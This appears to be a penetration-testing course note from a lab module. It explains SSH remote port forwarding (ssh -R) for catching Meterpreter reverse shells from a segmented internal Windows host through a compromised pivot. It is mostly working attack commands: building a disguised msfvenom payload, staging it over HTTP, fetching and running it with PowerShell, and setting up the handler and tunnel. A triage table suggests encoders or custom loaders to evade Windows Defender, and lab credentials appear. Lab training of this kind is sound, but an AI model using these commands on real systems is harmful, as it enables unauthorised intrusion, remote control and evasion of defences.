# 04 — Remote/Reverse Port Forwarding with SSH

> `ssh -R` lets a compromised pivot expose a port that **forwards back** to a service on our attack host. Use it when the deep-internal target can reach the pivot but **cannot reach us** — classic for catching reverse shells from a segmented Windows box.

---

## The Routing Problem

```
Attacker 10.10.15.5
        │  (SSH/VPN)
        ▼
Ubuntu Pivot   ens192: 10.129.x.x   ens224: 172.16.5.129
        │
        ▼
Windows A 172.16.5.19   ← only knows the 172.16.5.0/23 network
```

- We can pivot **into** Windows A via SSH `-D` SOCKS + `xfreerdp`/`smbclient` (Section 3).
- But if we drop a payload on Windows A and it tries to call back to `10.10.15.5:8000`, **Windows A has no route there.** The 10.x network simply doesn't exist from its perspective.
- RDP-only access is limiting: no clipboard/file transfer, no Meterpreter API for low-level enumeration, no in-memory exploit execution.

**Solution:** make the pivot listen on its `172.16.5.129:8080` and forward every connection that lands there back through the SSH tunnel to our attack host's `127.0.0.1:8000` — where Metasploit's handler is waiting.

That's `ssh -R`.

---

## SSH Forwarding Modes — Recap

| Flag | Listener lives on | Forwards to | Used when |
|------|-------------------|-------------|-----------|
| `-L lport:host:rport` | **Attacker** | reachable from pivot | grab remote service to your loopback |
| `-D port` | **Attacker** | anywhere (SOCKS) | ad-hoc enum across pivot's subnets |
| `-R rport:host:lport` | **Pivot** | reachable from attacker | catch reverse shells from inside a segmented network |

---

## End-to-End Walkthrough — Catch a Meterpreter from Windows A through the Pivot

### 1. Generate a Windows reverse_https payload that calls the **pivot's** internal IP

```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=172.16.5.129 LPORT=8080 \
    -f exe -o backupscript.exe
```
> Builds a Windows reverse_https EXE whose `LHOST` is the pivot's internal IP; swap `LHOST`/`LPORT` and the output filename.

> `LHOST` = the IP **the Windows target can reach** (the pivot's internal NIC `172.16.5.129`).
> `LPORT` = the port we'll have the pivot **listen on** (we'll forward it to ourselves with `-R`).

### 2. Start a Metasploit handler on the attack host listening on 8000

```text
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_https
msf6 > set lhost 0.0.0.0
msf6 > set lport 8000
msf6 > set ExitOnSession false
msf6 > run -j
[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```

### 3. Push the payload to the pivot and host it

```bash
# Copy via scp (pivot creds: ubuntu:HTB_@cademy_stdnt!)
scp backupscript.exe ubuntu@<PIVOT_EXT_IP>:~/

# On the pivot, serve it on 8123 (or any free port)
ubuntu@WEB01:~$ python3 -m http.server 8123
```
> Copies the payload to the pivot then serves it over HTTP for the Windows target to fetch; swap `ubuntu@PIVOT`, filename, and port.

### 4. Pull the payload onto Windows A (RDP/SMB session from Section 3)

```powershell
PS C:\> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" `
                          -OutFile "C:\backupscript.exe"
```
> Downloads the payload onto the Windows target from the pivot's HTTP server; swap the pivot IP/port, filename, and output path.

### 5. Set up the SSH **remote** forward from attacker → pivot

```bash
# Listen on the pivot's 172.16.5.129:8080, forward every connection back
# through the tunnel to our attack host's 0.0.0.0:8000 (where MSF is)
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@<PIVOT_EXT_IP> -vN
```
> Reverse forward: pivot listens on `172.16.5.129:8080` and tunnels back to your handler on `8000`; swap the pivot bind IP/port, local port, and `ubuntu@PIVOT`.

| Token | Meaning |
|-------|---------|
| `172.16.5.129:8080` | bind address/port **on the pivot** (must be reachable from Windows A) |
| `0.0.0.0:8000` | destination as seen **from the attacker** (where MSF listens) |
| `-v` | verbose — shows incoming forwarded connections |
| `-N` | don't open a remote shell |

### 5a. Pivot must allow remote forwards binding to non-loopback

`-R` will **silently bind to 127.0.0.1 only** unless `sshd_config` on the pivot has:

```
GatewayPorts yes      # or 'clientspecified'
```

If not, restart with that set, or fall back to:

```bash
# Bind to localhost on pivot, then use socat to expose it on ens224
ssh -R 8080:0.0.0.0:8000 ubuntu@<PIVOT_EXT_IP> -vN

# On the pivot:
ubuntu@WEB01:~$ socat TCP-LISTEN:8080,fork,reuseaddr,bind=172.16.5.129 TCP:127.0.0.1:8080
```
> Fallback when `GatewayPorts` is off: bind `-R` to loopback then socat-expose it on the pivot's internal NIC; swap `ubuntu@PIVOT`, ports, and bind IP.

### 6. Execute the payload on Windows A

```powershell
PS C:\> C:\backupscript.exe
```
> Executes the dropped payload on the Windows target to trigger the callback; swap the executable path.

SSH verbose log on the attacker side will print:

```
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080,
        originator 172.16.5.19 port 61355
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
debug1: channel 1: connected to 0.0.0.0 port 8000
```

Metasploit pops:

```
[*] https://0.0.0.0:8000 handling request from 127.0.0.1; ...
[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1 ) at ...
```

> Both endpoints look like `127.0.0.1` because the connection is being **delivered locally** through our SSH client process. That's expected for `-R`.

### 7. Use the session

```text
meterpreter > getuid
meterpreter > sysinfo
meterpreter > shell
C:\> whoami
```

---

## Visual

```
                                                   ┌────────────────────┐
ATTACKER (10.10.15.5)                              │  PIVOT (Ubuntu)    │
                                                   │  ens192: 10.129.x  │
   msfconsole listener                             │  ens224: 172.16.5.129
   0.0.0.0:8000  ◄────── SSH channel ──────── ssh -R bind 172.16.5.129:8080
        ▲                                          │         ▲
        │  reverse_https tunneled in SSH           │         │ TCP from inside
        │                                          │         │ 172.16.5.0/23
        └──────── delivered locally to MSF ────────┘         │
                                                             │
                                            WINDOWS A (172.16.5.19)
                                            backupscript.exe → 172.16.5.129:8080
```

---

## Quick-Reference Commands

```bash
# Payload pointed at the pivot's internal IP
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=PIVOT_INTERNAL_IP LPORT=8080 -f exe -o p.exe

# Handler on attacker
msfconsole -q -x "use exploit/multi/handler;
                 set payload windows/x64/meterpreter/reverse_https;
                 set lhost 0.0.0.0; set lport 8000;
                 set ExitOnSession false; run -j"

# Reverse forward
ssh -R PIVOT_INTERNAL_IP:8080:0.0.0.0:8000 user@PIVOT -vN

# Headless background reverse forward
ssh -fNT -R PIVOT_INTERNAL_IP:8080:127.0.0.1:8000 user@PIVOT

# Drop & run on Windows (from RDP/SMB)
Invoke-WebRequest -Uri "http://PIVOT_INTERNAL_IP:8123/p.exe" -OutFile C:\p.exe
C:\p.exe
```
> Copy-paste reverse-forward recipe: payload, handler, `ssh -R`, then fetch/run on Windows; swap `PIVOT_INTERNAL_IP`, ports, `user@PIVOT`.

---

## STUCK? Triage

| Symptom | Fix |
|---------|-----|
| Pivot's `-R` only listens on 127.0.0.1 (target can't reach it) | set `GatewayPorts yes` in pivot `/etc/ssh/sshd_config`; or chain `socat TCP-LISTEN:8080,fork bind=PIVOT_IP TCP:127.0.0.1:8080` |
| Payload runs but MSF never receives | LHOST in payload ≠ pivot internal IP; or pivot firewall blocks 8080 — check with `ss -tlnp` on pivot |
| Connection appears, then drops | mismatched payload (`reverse_tcp` vs `reverse_https`) between msfvenom and handler |
| `bind: Permission denied` on pivot | binding privileged port (<1024) without root — pick port ≥1024 |
| Windows Defender eats `backupscript.exe` | use `--encoder x64/xor_dynamic`, shikata-ga-nai chain, or roll a custom shellcode loader |
| `sshd: remote port forwarding failed for listen port 8080` | port already in use on pivot — `lsof -i:8080` and kill, or pick another port |
| Meterpreter session dies on first command | network instability over double tunnel — `set AutoRunScript 'migrate -N explorer.exe'` to migrate immediately |

---

## Key Takeaways

1. **`-L`** brings a remote service to **you**. **`-R`** publishes one of **your** services on the **pivot**.
2. Reverse shells from segmented internal hosts almost always need `-R` — the deep host can reach the pivot but never us.
3. The payload's `LHOST` must be the **pivot's address that the target can actually reach** (`172.16.5.129`), not your VPN IP.
4. Pivot's `sshd` must have `GatewayPorts yes` for `-R` to bind on a non-loopback interface; otherwise add a `socat` relay on the pivot.
5. Verbose SSH (`-v`) on the attack box is your live tap into who connected back and when.

---

## References

- Previous: [03-Dynamic_Port_Forwarding_with_SSH_and_SOCKS_Tunneling.md](03-Dynamic_Port_Forwarding_with_SSH_and_SOCKS_Tunneling.md)
- Next: [05-Meterpreter_Tunneling_and_Port_Forwarding.md](05-Meterpreter_Tunneling_and_Port_Forwarding.md)
- `man ssh` — search `-R`, `GatewayPorts`
- Metasploit `multi/handler` docs: <https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html>
